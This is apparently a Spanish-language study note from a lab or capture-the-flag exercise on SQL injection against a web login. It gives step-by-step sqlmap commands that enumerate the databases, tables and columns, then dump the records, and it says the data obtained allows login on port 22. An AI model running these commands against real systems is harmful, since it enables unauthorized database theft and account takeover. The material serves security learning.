- Las inyecciones SQL acontecen en los login web.

![](../Imagenes/Pasted%20image%2020241219201913.png)

- Vamos a usar la herramienta ==sqlmap==.

![](../Imagenes/Pasted%20image%2020241219202455.png)

- Con esta herramienta podemos encontrar:
	- Bases de datos
		- Tablas, columnas y registros.
- Es importante tener conocimiento de SQL.
https://www.youtube.com/watch?v=FbGG_cyLUAc
- Usamos el siguiente comando:
```
sqlmap -u (URL_CORRESPONDIENTE) --forms --dbs --batch
```

![](../Imagenes/Pasted%20image%2020241219202912.png)

- Encontramos los siguientes bases de datos:

![](../Imagenes/Pasted%20image%2020241219203414.png)

- Nos interesa Webapp.
- Vamos a usar el siguiente comando utilizando Webapp:
```
sqlmap -u (URL_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) --tables --batch
```

![](../Imagenes/Pasted%20image%2020241219203707.png)

- Nos encontró 1 tabla:

![](../Imagenes/Pasted%20image%2020241219203836.png)

- Que hay dentro de esta tabla?, Columnas.
- Para ver que columnas posee vamos a usar el siguiente código:
```
sqlmap -u (URLS_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) -T (TABLA) --columns --batch
```

![](../Imagenes/Pasted%20image%2020241219204140.png)

- Nos da las siguientes columnas.

![](../Imagenes/Pasted%20image%2020241219204516.png)

- Ahora vamos a ver los registros de las columnas con el siguiente código:
```
sqlmap -u (URLS_CORRESPONDIENTE) --forms -D (NOMBRE_BASE_DATOS) -T (TABLA) -C(COLUMNAS) --dump --batch
```

![](../Imagenes/Pasted%20image%2020241219204737.png)
- Ya tenemos toda la información que necesitamos:

![](../Imagenes/Pasted%20image%2020241219205227.png)

- Ya con esto podemos entrar por el puerto 22.